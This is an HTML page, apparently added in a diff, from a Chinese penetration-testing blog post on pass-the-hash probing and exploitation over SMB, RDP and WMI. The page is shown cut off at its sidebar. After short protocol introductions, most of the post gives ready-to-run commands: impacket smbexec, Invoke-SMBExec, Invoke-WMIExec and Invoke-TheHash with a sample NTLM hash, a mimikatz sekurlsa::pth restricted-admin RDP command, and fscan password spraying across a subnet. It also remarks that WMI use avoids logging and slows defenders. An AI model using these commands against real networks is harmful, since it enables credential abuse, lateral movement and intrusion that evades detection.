@@ -1,0 +1,622 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="baidu-site-verification" content="FBx6u1uWmY">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('https://chenzidu.github.io').hostname,
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.5.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":false,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: true,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    sidebarPadding: 40
+  };
+</script>
+  <meta name="description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SMB_RDP_WMI_hash传递探测_利用">
+<meta property="og:url" content="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/index.html">
+<meta property="og:site_name" content="Chen&#39;Blog">
+<meta property="og:description" content="smb介绍&amp;emsp;&amp;emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP&#x2F;IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066674718-5375ef86-6171-41e6-adca-2f78f3fca855.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=454&id=ua6ea3a2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=681&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76007&status=done&style=none&taskId=u6135a004-50ae-43aa-a3b5-7564d19f4cc&title=&width=734">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066475361-5ddea932-19ca-4944-a7d6-8dc0cb3bf9e5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub3b799d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=1601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30162&status=done&style=none&taskId=uc4b7af49-776d-4240-9744-f1710c5e47f&title=&width=1067.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654063612363-03fa4c1f-0bf8-434f-8d21-4d324ece3229.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=wGxXK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71054&status=done&style=none&taskId=u696f65af-cee5-4750-b7fa-13a0039a1c4&title=&width=960">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066642326-95000608-5535-45e9-bbfc-839e1f0daca2.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=uac555c22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85491&status=done&style=none&taskId=uf5f2f1a4-57e5-4001-93cb-8e9683a2bdf&title=&width=722">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666">
+<meta property="article:published_time" content="2022-06-02T01:41:34.000Z">
+<meta property="article:modified_time" content="2022-12-11T09:31:21.954Z">
+<meta property="article:author" content="ChenZIDu">
+<meta property="article:tag" content="hash传递">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333">
+
+<link rel="canonical" href="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>SMB_RDP_WMI_hash传递探测_利用 | Chen'Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Chen'Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Chen'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">Life has its own fate, and meeting may not be accidental.</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-fw fa-sitemap"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://chenzidu.github.io/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="ChenZIDu">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Chen'Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          SMB_RDP_WMI_hash传递探测_利用
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-02 09:41:34" itemprop="dateCreated datePublished" datetime="2022-06-02T09:41:34+08:00">2022-06-02</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-12-11 17:31:21" itemprop="dateModified" datetime="2022-12-11T17:31:21+08:00">2022-12-11</time>
+              </span>
+
+          
+
+<span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">字数统计:</span>
+           <span class="post-count">859(字)</span>
+           
+         </span>
+	  
+      <span class="post-time">
+	   &nbsp; | &nbsp;
+           <span class="post-meta-item-icon">
+             <i class="fa fa-calendar-o"></i>
+           </span>
+           <span class="post-meta-item-text">阅读时长:</span>
+           <span class="post-count">3(分)</span>
+           
+        </span>
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/#comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/06/02/SMB-RDP-WMI-hash%E4%BC%A0%E9%80%92%E6%8E%A2%E6%B5%8B-%E5%88%A9%E7%94%A8/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="smb"><a href="#smb" class="headerlink" title="smb"></a>smb</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;SMB服务大多运行在windows系统上，SMB通信协议协议在网络上的端点之间提供对文件、打印机和串行端口的共享访问。在扫描过程中，我们通常会看到目标上的 445 TCP 端口打开，为 SMB 协议保留。Microsoft SMB 协议是传输层协议最常使用的是基于 TCP/IP (NBT) 的 NetBIOS，正因为如此，它依赖于较低级别的传输协议。这就是为什么在扫描过程中，我们很可能会同时看到具有在目标上运行的开放端口的协议。<br><br>&emsp;&emsp;使用 SMB 协议，应用程序（或应用程序的用户）可以访问远程服务器上的文件，以及打印机等其他资源。 因此，客户端应用程序可以读取、创建和更新文件远程服务器。 它还可以与任何设置为接收 SMB 客户端的服务器程序通信要求。<br><br>&emsp;&emsp;网络上启用 SMB 的存储称为共享。 任何拥有服务器的地址和正确的凭据。 与许多其他文件访问协议一样，SMB 需要一些安全层在网络拓扑中正常运行。 如果 SMB 允许客户端创建、编辑、<br>检索和删除共享上的文件，显然需要一种身份验证机制。 在用户层面，SMB 客户端需要提供用户名/密码组合才能查看内容或与内容交互SMB共享。<br><br>&emsp;&emsp;如果扫描得到目标IP的TCP445开放，为了成功枚举远程系统上的共享内容，我们可以使用一个名为smb客户端。</p>
+<a id="more"></a>
+
+<h3 id="单IP"><a href="#单IP" class="headerlink" title="单IP"></a>单IP</h3><h4 id="smbexec-hash传递"><a href="#smbexec-hash传递" class="headerlink" title="smbexec_hash传递"></a>smbexec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\smbexec.exe -hashes :<span class="number">973f</span>cd01b987e913cc0209c2f462a751 ./<span class="symbol">administrator@</span><span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654062783250-d35fada8-94fe-4ec2-8004-665f809dc04f.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=692&id=u09f28a6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1038&originWidth=1724&originalType=binary&ratio=1&rotation=0&showTitle=false&size=128014&status=done&style=none&taskId=udffff2c3-7bde-47c4-a27f-e473f937928&title=&width=1149.3333333333333" alt="image.png"></p>
+<h4 id="SMBExec-hash探测"><a href="#SMBExec-hash探测" class="headerlink" title="SMBExec_hash探测"></a>SMBExec_hash探测</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-SMBExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066837915-33437c7d-ef61-4e52-97f3-ae823c4cbbd5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=55&id=ua98328a9&margin=%5Bobject%20Object%5D&name=image.png&originHeight=82&originWidth=1618&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24562&status=done&style=none&taskId=uc35fe1c4-3465-4def-88eb-7f95b16d7c6&title=&width=1078.6666666666667" alt="image.png"></p>
+<h3 id="网段"><a href="#网段" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-SMB探测"><a href="#fscan-SMB探测" class="headerlink" title="fscan_SMB探测"></a>fscan_SMB探测</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h 192.168.1.0/24 -m<span class="built_in"> smb </span>-pwd asd123=</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066674718-5375ef86-6171-41e6-adca-2f78f3fca855.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=454&id=ua6ea3a2d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=681&originWidth=1101&originalType=binary&ratio=1&rotation=0&showTitle=false&size=76007&status=done&style=none&taskId=u6135a004-50ae-43aa-a3b5-7564d19f4cc&title=&width=734" alt="image.png"></p>
+<h4 id="Ps1-hash传递"><a href="#Ps1-hash传递" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066475361-5ddea932-19ca-4944-a7d6-8dc0cb3bf9e5.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=63&id=ub3b799d5&margin=%5Bobject%20Object%5D&name=image.png&originHeight=94&originWidth=1601&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30162&status=done&style=none&taskId=uc4b7af49-776d-4240-9744-f1710c5e47f&title=&width=1067.3333333333333" alt="image.png"></p>
+<h2 id="RDP"><a href="#RDP" class="headerlink" title="RDP"></a>RDP</h2><h3 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;远程桌面协议(RDP)是一个多通道(multi-channel)的协议，让使用者(所在计算机称为用户端或’本地计算机’)连上提供微软终端机服务的计算机(称为服务端或’远程计算机’)。</p>
+<h3 id="单IP-1"><a href="#单IP-1" class="headerlink" title="单IP"></a>单IP</h3><h4 id="mimikatz-hash传递"><a href="#mimikatz-hash传递" class="headerlink" title="mimikatz_hash传递"></a>mimikatz_hash传递</h4><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">sekurlsa:</span>:pth <span class="regexp">/user:Administrator /</span><span class="string">domain:</span><span class="number">973</span>fcd01b987e913cc0209c2f462a751 <span class="regexp">/ntlm:973fcd01b987e913cc0209c2f462a751 "/</span><span class="string">run:</span>mstsc.exe /restrictedadmin<span class="string">"</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654063612363-03fa4c1f-0bf8-434f-8d21-4d324ece3229.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=480&id=wGxXK&margin=%5Bobject%20Object%5D&name=image.png&originHeight=720&originWidth=1440&originalType=binary&ratio=1&rotation=0&showTitle=false&size=71054&status=done&style=none&taskId=u696f65af-cee5-4750-b7fa-13a0039a1c4&title=&width=960" alt="image.png"></p>
+<h3 id="网段-1"><a href="#网段-1" class="headerlink" title="网段"></a>网段</h3><h4 id="fscan-扫描"><a href="#fscan-扫描" class="headerlink" title="fscan_扫描"></a>fscan_扫描</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\fs.exe -h <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -m rdp -pwd asd123=</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066642326-95000608-5535-45e9-bbfc-839e1f0daca2.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=497&id=uac555c22&margin=%5Bobject%20Object%5D&name=image.png&originHeight=746&originWidth=1083&originalType=binary&ratio=1&rotation=0&showTitle=false&size=85491&status=done&style=none&taskId=uf5f2f1a4-57e5-4001-93cb-8e9683a2bdf&title=&width=722" alt="image.png"></p>
+<h2 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h2><h3 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h3><p>&emsp;&emsp;WMI的全名为”Windows Management Instrumentation”。从win8后，Windows操作系统都支持WMI，WMI可以在本地或者远程管理计算机系统。<br><br>&emsp;&emsp;自从PsExec在内网中被严格监控后，越来越多的反病毒厂商将PsExec加入了黑名单，于是乎攻击者转向使用WMI进行横向移动。在渗透时发现，在使用wmiexec进行横向移动时，Windows操作系统默认不会将WMI的操作记录在日志中。因为这个过程不会记录日志，所以对蓝队来说大大增加了溯源的成本。对攻击者来说，被发现的可能性降低，隐蔽性提高。很多APT组织现在都喜欢使用WMI进行攻击。</p>
+<h3 id="单IP-2"><a href="#单IP-2" class="headerlink" title="单IP"></a>单IP</h3><h4 id="WMIExec-hash传递"><a href="#WMIExec-hash传递" class="headerlink" title="WMIExec_hash传递"></a>WMIExec_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.8</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
+<h4 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066895951-c8da0db7-1b91-4f33-89e3-4fc7b086dfb4.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=51&id=ub9b3abc8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=77&originWidth=1595&originalType=binary&ratio=1&rotation=0&showTitle=false&size=22139&status=done&style=none&taskId=uee3ff694-cdd1-45f5-9577-b21e4592706&title=&width=1063.3333333333333" alt="image.png"></h4><h3 id="网段-2"><a href="#网段-2" class="headerlink" title="网段"></a>网段</h3><h4 id="Ps1-hash传递-1"><a href="#Ps1-hash传递-1" class="headerlink" title="Ps1_hash传递"></a>Ps1_hash传递</h4><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-TheHash -Type WMIExec -Target <span class="number">192.168</span><span class="number">.1</span><span class="number">.0</span>/<span class="number">24</span> -Domain DESKTOP-QD1A1VJ -Username administrator -Hash <span class="number">973f</span>cd01b987e913cc0209c2f462a751</span><br></pre></td></tr></table></figure>
+<h2 id="-1"><a href="#-1" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654066316709-eecd7305-9629-4222-9d7d-6625f0e4e047.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=69&id=ue4619d3a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=103&originWidth=1600&originalType=binary&ratio=1&rotation=0&showTitle=false&size=30387&status=done&style=none&taskId=u77ff4673-564f-4458-bc6e-df773ce0a5c&title=&width=1066.6666666666667" alt="image.png"></h2><h3 id="超级弱口令检查工具-SMB-RDP"><a href="#超级弱口令检查工具-SMB-RDP" class="headerlink" title="超级弱口令检查工具 SMB/RDP"></a>超级弱口令检查工具 SMB/RDP</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/2118454/1654067044438-186b5985-b19a-40a2-bc65-c295c145f39c.png#clientId=u939ddc04-5594-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=701&id=u7a89aa82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1052&originWidth=1312&originalType=binary&ratio=1&rotation=0&showTitle=false&size=206076&status=done&style=none&taskId=ubf7b89bb-8301-4e59-a6ea-77faab429f9&title=&width=874.6666666666666" alt="image.png"></p>
+<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br><a href="https://github.com/shadow1ng/fscan" target="_blank" rel="noopener">https://github.com/shadow1ng/fscan</a><br><a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a><br><a href="https://github.com/shack2/SNETCracker" target="_blank" rel="noopener">https://github.com/shack2/SNETCracker</a><br><a href="https://github.com/gentilkiwi/mimikatz" target="_blank" rel="noopener">https://github.com/gentilkiwi/mimikatz</a></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/hash%E4%BC%A0%E9%80%92/" rel="tag"># hash传递</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/15/cobaltstrike%E5%9F%9F%E5%89%8D%E7%BD%AE/" rel="prev" title="cobaltstrike域前置">
+      <i class="fa fa-chevron-left"></i> cobaltstrike域前置
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/09/22/C-%E5%8F%98%E5%BD%A2%E5%85%8D%E6%9D%80%E5%88%9D%E6%8E%A2%EF%BC%88%E4%B8%80%EF%BC%89/" rel="next" title="C++变形免杀初探（一）">
+      C++变形免杀初探（一） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+    <div class="comments" id="comments"></div>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
